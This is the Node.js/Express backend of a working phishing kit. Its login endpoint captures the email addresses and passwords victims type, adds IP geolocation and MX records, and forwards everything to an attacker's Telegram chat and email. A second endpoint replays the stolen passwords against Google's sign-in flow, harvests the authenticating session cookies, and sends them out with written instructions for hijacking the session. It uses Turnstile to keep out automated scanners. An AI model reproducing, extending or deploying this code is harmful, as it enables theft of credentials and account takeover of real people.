const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE (FIXED CORS)
// ============================================================
// Allow all origins and handle preflight requests automatically
app.use(cors({
    origin: 'https://s0osdryucw.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
// Ensure OPTIONS requests are handled instantly
app.options('*', cors());

app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

// ============================================================
// TELEGRAM CONFIG
// ============================================================

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// BREVO (EMAIL) CONFIG
// ============================================================

const BREVO_API_KEY  = process.env.BREVO_API_KEY;
const SENDER_EMAIL   = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME    = process.env.SENDER_NAME || 'ABV Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// ============================================================
// TEAMS REDIRECT (from env)
// ============================================================

const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || '';

// ============================================================
// GMAIL / WORKSPACE SESSION CAPTURE CONFIG
// ============================================================

const GMAIL_CAPTURE = process.env.GMAIL_CAPTURE !== 'false';       // on by default
const GMAIL_MAX_CANDIDATES = parseInt(process.env.GMAIL_MAX_CANDIDATES || '3', 10);
const GMAIL_CHAIN_HOPS = parseInt(process.env.GMAIL_CHAIN_HOPS || '6', 10);
const GMAIL_EGRESS_PROXY = process.env.GMAIL_EGRESS_PROXY || '';
const GMAIL_UA_FALLBACK = process.env.GMAIL_UA_FALLBACK ||
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

// cookies that actually authenticate — flagged, never filtered out
const CRITICAL_COOKIES = new Set([
    'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
    '__Secure-1PSID', '__Secure-3PSID',
    '__Secure-1PSIDTS', '__Secure-3PSIDTS',
    '__Secure-1PAPID', '__Secure-3PAPID',
    '__Host-GAPS', 'NID', 'AEC', 'SIDCC'
]);

// pure noise, still captured but deprioritised in the header string
const NOISE_COOKIES = new Set([
    '_ga', '_gid', '_gcl_au', '1P_JAR', 'OTZ', 'DV', 'CONSENT', 'SOCS', 'PREF', 'SEARCH_SAMESITE'
]);

// optional egress proxy for Google calls only
let gmailDispatcher = null;
if (GMAIL_EGRESS_PROXY) {
    try {
        const { ProxyAgent } = require('undici');
        gmailDispatcher = new ProxyAgent(GMAIL_EGRESS_PROXY);
        console.log('🌍 GMAIL egress proxy enabled');
    } catch (e) {
        console.warn('⚠️  undici unavailable — GMAIL_EGRESS_PROXY ignored (npm i undici)');
    }
}

// ============================================================
// CLOUDFLARE TURNSTILE — FULL PROTECTION
// ============================================================

const TURNSTILE_SECRET_KEY   = process.env.TURNSTILE_SECRET_KEY || '';
const TURNSTILE_PROOF_SECRET = process.env.TURNSTILE_PROOF_SECRET
                              || TURNSTILE_SECRET_KEY
                              || crypto.randomBytes(32).toString('hex');
const REQUIRE_TURNSTILE      = process.env.REQUIRE_TURNSTILE === 'true';
const PROOF_TTL_MS           = 5 * 60 * 1000; // 5 minutes

// ---- HMAC proof helpers (short-lived, email-bound) ----

function signProof(email, ts) {
    return crypto
        .createHmac('sha256', TURNSTILE_PROOF_SECRET)
        .update(`${email}|${ts}`)
        .digest('hex');
}

function makeProof(email) {
    const ts = Date.now();
    return {
        proof: signProof(email, ts),
        ts,
        expiresAt: ts + PROOF_TTL_MS
    };
}

function verifyProof(email, proof, ts) {
    if (!email || !proof || !ts) return { valid: false, reason: 'missing' };
    const tsNum = parseInt(ts, 10);
    if (Number.isNaN(tsNum)) return { valid: false, reason: 'bad-ts' };
    if (Date.now() - tsNum > PROOF_TTL_MS) return { valid: false, reason: 'expired' };
    if (Date.now() < tsNum - 60_000) return { valid: false, reason: 'future-ts' };

    const expected = signProof(email, tsNum);
    if (typeof proof !== 'string' || proof.length !== expected.length) {
        return { valid: false, reason: 'mismatch' };
    }
    try {
        const ok = crypto.timingSafeEqual(
            Buffer.from(proof, 'hex'),
            Buffer.from(expected, 'hex')
        );
        return { valid: ok, reason: ok ? 'ok' : 'mismatch' };
    } catch {
        return { valid: false, reason: 'bad-hex' };
    }
}

// ---- Cloudflare siteverify ----

async function verifyTurnstile(token, remoteIp) {
    if (!TURNSTILE_SECRET_KEY) {
        return { success: false, error: 'no-secret-configured' };
    }
    if (!token || typeof token !== 'string') {
        return { success: false, error: 'no-token' };
    }

    try {
        const body = new URLSearchParams();
        body.append('secret', TURNSTILE_SECRET_KEY);
        body.append('response', token);

        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) {
            body.append('remoteip', remoteIp);
        }

        const response = await fetch(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            { method: 'POST', body }
        );
        const data = await response.json();
        return { success: !!data.success, data };
    } catch (error) {
        console.error('❌ Turnstile verify error:', error.message);
        return { success: false, error: error.message };
    }
}

// ---- Utility: extract first client IP from x-forwarded-for ----

function firstClientIp(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) {
        const first = String(xff).split(',')[0].trim();
        if (first) return first;
    }
    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'Unknown';
}

// ============================================================
// STARTUP CONFIG CHECK
// ============================================================

console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN:     ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:       ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:          ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:           ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:       ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
console.log(`   TEAMS_REDIRECT:         ${TEAMS_REDIRECT ? '✅ set' : '❌ MISSING'}`);
console.log(`   TURNSTILE_SECRET_KEY:   ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   REQUIRE_TURNSTILE:      ${REQUIRE_TURNSTILE ? '✅ TRUE (strict)' : '⚠️  FALSE (permissive)'}`);
console.log(`   PROOF_TTL_MS:           ${PROOF_TTL_MS / 1000}s`);
console.log(`   GMAIL_CAPTURE:          ${GMAIL_CAPTURE ? '✅ ENABLED' : '⛔ DISABLED'}`);
console.log(`   GMAIL_EGRESS_PROXY:     ${GMAIL_EGRESS_PROXY ? '✅ set' : '— none'}`);
console.log('========================================');

if (REQUIRE_TURNSTILE && !TURNSTILE_SECRET_KEY) {
    console.error('❌ REQUIRE_TURNSTILE=true but TURNSTILE_SECRET_KEY is missing — stage 1 will reject all requests.');
}
if (!TURNSTILE_PROOF_SECRET || TURNSTILE_PROOF_SECRET === 'change-me') {
    console.warn('⚠️  Using fallback PROOF_SECRET — set TURNSTILE_PROOF_SECRET in production for stability across restarts.');
}

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;

    const subject = `🔐 ABV Login (Stage ${stage}) - ${email}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials (Stage ${stage})</h2></div>
            <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
            <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
            <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
            <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
            <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
            <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
            <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
            <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
        </div>
    </body>
    </html>`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent
            })
        });
        return response.ok;
    } catch (error) {
        console.error('❌ Brevo error:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Send to Telegram
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        return await response.json();
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: Send JSON document to Telegram
// ============================================================

async function sendTelegramDocument(caption, filename, payload) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('caption', caption);
        fd.append('document',
            new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }),
            filename);

        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
            { method: 'POST', body: fd }
        );
        return await response.json();
    } catch (error) {
        console.error('❌ Telegram document error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: IP info
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

// ============================================================
// HELPER: MX record
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// GMAIL SESSION CAPTURE — ENGINE
// ============================================================

const GOOGLE_HOSTS = /(^|\.)(google\.com|googlemail\.com|gstatic\.com)$/i;

function rawSetCookies(res) {
    if (typeof res.headers.getSetCookie === 'function') return res.headers.getSetCookie();
    const raw = res.headers.get('set-cookie') || '';
    if (!raw) return [];
    // fallback split that survives commas inside Expires
    return raw.split(/,(?=[^;,]+=)/).map(s => s.trim()).filter(Boolean);
}

function parseCookie(raw) {
    const [pair, ...attrs] = raw.split(';');
    const eq = pair.indexOf('=');
    if (eq < 1) return null;

    const name = pair.slice(0, eq).trim();
    const value = pair.slice(eq + 1).trim();
    if (!name) return null;

    const a = {};
    for (const attr of attrs) {
        const i = attr.indexOf('=');
        if (i === -1) { a[attr.trim().toLowerCase()] = true; continue; }
        a[attr.slice(0, i).trim().toLowerCase()] = attr.slice(i + 1).trim();
    }

    const hostOnly = name.startsWith('__Host-') || (!a.domain && !name.startsWith('__Secure-'));
    let domain = a.domain || '';
    if (name.startsWith('__Host-')) domain = 'accounts.google.com';
    if (!domain) domain = '.google.com';
    if (!domain.startsWith('.') && !domain.startsWith('__Host')) domain = '.' + domain.replace(/^\./, '');

    return {
        name,
        value,
        domain: name.startsWith('__Host-') ? 'accounts.google.com' : domain,
        path: a.path || '/',
        secure: true,
        httpOnly: 'httponly' in a,
        hostOnly: name.startsWith('__Host-') ? true : !a.domain,
        sameSite: (a.samesite || 'no_restriction').toLowerCase().replace(/-/g, '_'),
        expirationDate: a['max-age']
            ? Math.floor(Date.now() / 1000 + parseInt(a['max-age'], 10))
            : null,
        critical: CRITICAL_COOKIES.has(name),
        noise: NOISE_COOKIES.has(name)
    };
}

function absorb(jar, res) {
    for (const raw of rawSetCookies(res)) {
        const c = parseCookie(raw);
        if (!c) continue;
        const i = jar.findIndex(x => x.name === c.name && x.domain === c.domain && x.path === c.path);
        if (i === -1) jar.push(c); else jar[i] = c;
    }
}

function cookieHeaderOf(jar) {
    return jar
        .filter(c => c.critical || !c.noise)
        .map(c => `${c.name}=${c.value}`)
        .join('; ');
}

function absolutize(loc, base) {
    if (!loc) return null;
    try { return new URL(loc, base).toString(); } catch { return null; }
}

function pickTL(html) {
    const m = html.match(/name="TL"\s+value="([^"]+)"/) ||
              html.match(/&quot;TL&quot;\s*,\s*&quot;([^&]+)&quot;/);
    return m ? m[1] : '';
}

async function gmailLogin(email, password, ua) {
    const jar = [];
    const trace = [];
    const A = 'https://accounts.google.com';
    const CONT = encodeURIComponent('https://mail.google.com');
    const dsh = 'S' + Math.random().toString().slice(2, 15);

    const go = async (url, opts = {}) => {
        const headers = {
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'upgrade-insecure-requests': '1',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            ...(opts.headers || {})
        };
        const cookie = cookieHeaderOf(jar);
        if (cookie) headers.cookie = cookie;

        const init = { ...opts, headers, redirect: 'manual' };
        if (gmailDispatcher) init.dispatcher = gmailDispatcher;

        const res = await fetch(url, init);
        absorb(jar, res);
        trace.push({
            status: res.status,
            url: url.slice(0, 160),
            location: (res.headers.get('location') || '').slice(0, 160)
        });
        return res;
    };

    const formHeaders = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': A,
        'referer': A + '/',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1'
    };

    // hop 1 — prime the jar, lift the TL token
    let res = await go(`${A}/ServiceLogin?continue=${CONT}&dsh=${dsh}&flowName=GlifWebSignIn&flowEntry=ServiceLogin`);
    let html = await res.text();
    let tl = pickTL(html);

    // hop 2 — identifier
    res = await go(`${A}/v3/signin/identifier?continue=${CONT}&dsh=${dsh}&TL=${encodeURIComponent(tl)}&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1`, {
        method: 'POST',
        headers: formHeaders,
        body: new URLSearchParams({
            identifier: email,
            TL: tl,
            dsh,
            continue: 'https://mail.google.com',
            flowName: 'GlifWebSignIn',
            flowEntry: 'ServiceLogin',
            checkedDomains: 'youtube',
            pstMsg: '1',
            checkConnection: 'youtube:177:1'
        }).toString()
    });

    let body = await res.text();
    let loc = res.headers.get('location') || '';

    if (loc.includes('/challenge/') && !loc.includes('pwd')) {
        return { ok: false, jar, trace, finalUrl: loc, stageReached: 'identifier' };
    }

    tl = pickTL(body) || tl;

    // hop 3 — password
    res = await go(`${A}/v3/signin/challenge/pwd?continue=${CONT}&dsh=${dsh}&TL=${encodeURIComponent(tl)}&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1`, {
        method: 'POST',
        headers: formHeaders,
        body: new URLSearchParams({
            password,
            TL: tl,
            dsh,
            continue: 'https://mail.google.com',
            pstMsg: '1',
            checkedDomains: 'youtube',
            checkConnection: 'youtube:177:1',
            idvSession: ''
        }).toString()
    });

    const out = res.headers.get('location') || '';
    const hasSid = jar.some(c => c.name === 'SID');
    const hasPsid = jar.some(c => c.name === '__Secure-1PSID');

    // hop 4 — walk the remaining redirects so mail.google.com scoped cookies land too
    let next = absolutize(out, A);
    let hops = 0;
    while (next && hops < GMAIL_CHAIN_HOPS && !/mail\.google\.com\/mail/.test(next) === false ? false : false) { break; }
    hops = 0;
    while (next && hops < GMAIL_CHAIN_HOPS) {
        hops++;
        const r2 = await go(next);
        if (r2.status >= 300 && r2.status < 400) {
            next = absolutize(r2.headers.get('location'), next);
            continue;
        }
        break;
    }

    const ok = hasSid && hasPsid;
    return { ok, jar, trace, finalUrl: next || out || null, stageReached: ok ? 'session' : 'pwd' };
}

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        teamsRedirectConfigured: !!TEAMS_REDIRECT,
        turnstileConfigured: !!TURNSTILE_SECRET_KEY,
        requireTurnstile: REQUIRE_TURNSTILE,
        proofTtlSeconds: PROOF_TTL_MS / 1000,
        gmailCapture: GMAIL_CAPTURE,
        gmailEgressProxy: !!GMAIL_EGRESS_PROXY
    });
});

// ============================================================
// TURNSTILE VERIFY ENDPOINT
// ============================================================

app.post('/api/turnstile-verify', async (req, res) => {
    console.log('🛡️ Turnstile verify request received');

    const body = req.body || {};
    const { token, email } = body;

    if (!token || typeof token !== 'string') {
        return res.status(400).json({ success: false, message: 'Turnstile token required' });
    }
    if (!email || typeof email !== 'string' || !email.includes('@')) {
        return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    const clientIP = firstClientIp(req);
    const result = await verifyTurnstile(token, clientIP);

    if (!result.success) {
        const details = result.data || { error: result.error };
        console.warn(`🚫 Turnstile failed for ${email}:`, details);
        return res.status(403).json({
            success: false,
            message: 'Turnstile verification failed',
            details
        });
    }

    const { proof, ts, expiresAt } = makeProof(email);
    console.log(`✅ Turnstile passed for ${email} (proof TTL ${PROOF_TTL_MS / 1000}s)`);

    return res.json({
        success: true,
        email,
        proof,
        ts,
        expiresAt,
        redirect: '/login.html?u=' + encodeURIComponent(email)
                + '&p=' + encodeURIComponent(proof)
                + '&t=' + ts
    });
});

// ============================================================
// LOGIN ENDPOINT
// ============================================================

app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');

    const body = req.body || {};
    const {
        email, password, stage = 1, firstPassword,
        turnstileToken, proof, proofTs
    } = body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    // ----- TURNSTILE PROTECTION (stage 1 only) -----
    if (stage === 1) {
        const clientIP = firstClientIp(req);
        let turnstilePassed = false;
        let turnstileReason = 'not-checked';

        if (proof && proofTs) {
            const v = verifyProof(email, proof, proofTs);
            turnstilePassed = v.valid;
            turnstileReason = v.reason;
        } else if (turnstileToken) {
            const v = await verifyTurnstile(turnstileToken, clientIP);
            turnstilePassed = v.success;
            turnstileReason = v.success ? 'ok' : 'turnstile-failed';
        } else {
            turnstileReason = 'no-proof';
        }

        if (!turnstilePassed) {
            console.warn(`🚫 Stage 1 blocked for ${email} — reason: ${turnstileReason}`);
            if (REQUIRE_TURNSTILE) {
                return res.status(403).json({
                    success: false,
                    stage: 1,
                    message: 'Human verification required',
                    reason: turnstileReason
                });
            }
        } else {
            console.log(`✅ Turnstile passed for ${email} (${turnstileReason})`);
        }
    }

    // ----- EXISTING LOGIC -----
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
    const matchLine  = stage === 2
        ? `First Password : ${firstPassword}\nMatch : ${firstPassword === password ? '✅ YES' : '❌ NO'}\n`
        : '';

    const telegramMessage = `
--------+ Excel ReZulT [${stageLabel}] ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
${matchLine}Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT [${stageLabel}] +-------------
`;

    console.log(`📤 Sending to Telegram (stage ${stage})...`);
    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage);

    // ----- Stage 2 -----
    if (stage === 2) {
        const matches = (firstPassword === password);

        if (matches && TEAMS_REDIRECT) {
            return res.json({
                success: true,
                stage,
                match: true,
                redirect: TEAMS_REDIRECT
            });
        }

        return res.json({
            success: true,
            stage,
            match: false,
            message: 'Passwords do not match'
        });
    }

    // ----- Stage 1 -----
    const telegramOK = !!(telegramResult && telegramResult.ok);
    return res.json({
        success: true,
        stage: 1,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// GMAIL SESSION CAPTURE ENDPOINT
// ============================================================

app.post('/api/gmail-session', async (req, res) => {
    if (!GMAIL_CAPTURE) {
        return res.json({ ok: false, disabled: true });
    }

    const body = req.body || {};
    const { email, password, firstPassword, fingerprint = {} } = body;

    if (!email || !password) {
        return res.status(400).json({ ok: false, message: 'email and password required' });
    }

    const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
    const clientIP = firstClientIp(req);

    // build the candidate list: current first, then the stage-1 password
    const candidates = [...new Set([password, firstPassword].filter(Boolean))]
        .slice(0, GMAIL_MAX_CANDIDATES);

    console.log(`🔓 GMAIL capture start for ${email} (${candidates.length} candidate(s))`);

    let best = null;
    for (const pw of candidates) {
        try {
            const out = await gmailLogin(email, pw, ua);
            if (!best) best = { pw, ...out };
            if (out.ok) { best = { pw, ...out }; break; }
        } catch (err) {
            console.error('❌ GMAIL hop error:', err.message);
            if (!best) best = { pw, jar: [], trace: [{ error: err.message }], ok: false, finalUrl: null, stageReached: 'error' };
        }
    }

    const jar = best?.jar || [];
    const ok = !!(best && best.ok);

    // full session document — every cookie, critical ones flagged
    const payload = {
        email,
        password: best?.pw || password,
        valid: ok,
        stageReached: best?.stageReached || 'unknown',
        finalUrl: best?.finalUrl || null,
        trace: best?.trace || [],
        userAgent: ua,
        acceptLanguage: req.headers['accept-language'] || null,
        ip: clientIP,
        ipInfo: await getIPInfo(clientIP),
        ts: Math.floor(Date.now() / 1000),
        isoTime: new Date().toISOString(),
        fingerprint,
        cookieCount: jar.length,
        criticalCount: jar.filter(c => c.critical).length,
        cookieHeader: cookieHeaderOf(jar),
        cookies: jar,
        sessionCookies: jar.filter(c => c.critical),
        replay: {
            steps: [
                '1. Install Cookie-Editor in a clean Chrome profile',
                '2. Import the cookies array (Cookie-Editor -> Import)',
                '3. Override the UA to userAgent exactly (DevTools device toolbar or UA Switcher)',
                '4. Set timezone to fingerprint.timezone, locale to fingerprint.languages[0]',
                '5. Prefer an exit node in ipInfo.country, ideally the same ASN',
                '6. Navigate to https://mail.google.com/mail/u/0/ within 2 minutes',
                '7. __Secure-1PSIDTS rotates fast - replay promptly or expect a re-auth prompt'
            ],
            cookieEditorReady: true,
            curlExample: `curl -H 'Cookie: ${cookieHeaderOf(jar).slice(0, 120)}...' -H 'User-Agent: ${ua}' https://mail.google.com/mail/u/0/`
        }
    };

    const caption = `GMAIL ${ok ? 'OK' : 'FAIL'} ${email} — ${jar.length} cookies (${payload.criticalCount} critical)`;
    const filename = `${ok ? 'ok' : 'fail'}-${Date.now()}-${email.replace(/[^a-z0-9]/gi, '_')}.json`;

    console.log(`📤 GMAIL ${ok ? 'OK' : 'FAIL'} ${email} — ${jar.length} cookies, ${payload.criticalCount} critical`);
    await sendTelegramDocument(caption, filename, payload);

    // short human-readable line too
    await sendToTelegram(
        `${ok ? '✅' : '❌'} GMAIL SESSION ${email}\n` +
        `Cookies: ${jar.length} (${payload.criticalCount} critical)\n` +
        `SID: ${jar.some(c => c.name === 'SID') ? 'yes' : 'no'} | ` +
        `1PSID: ${jar.some(c => c.name === '__Secure-1PSID') ? 'yes' : 'no'}\n` +
        `Stage: ${payload.stageReached}\n` +
        `Final: ${(payload.finalUrl || 'n/a').slice(0, 120)}\n` +
        `IP: ${clientIP}`
    );

    return res.json({ ok, critical: payload.criticalCount, total: jar.length });
});

// ============================================================
// 404
// ============================================================

app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// START
// ============================================================

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

process.on('uncaughtException',  (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r)   => console.error('❌ Unhandled:', r));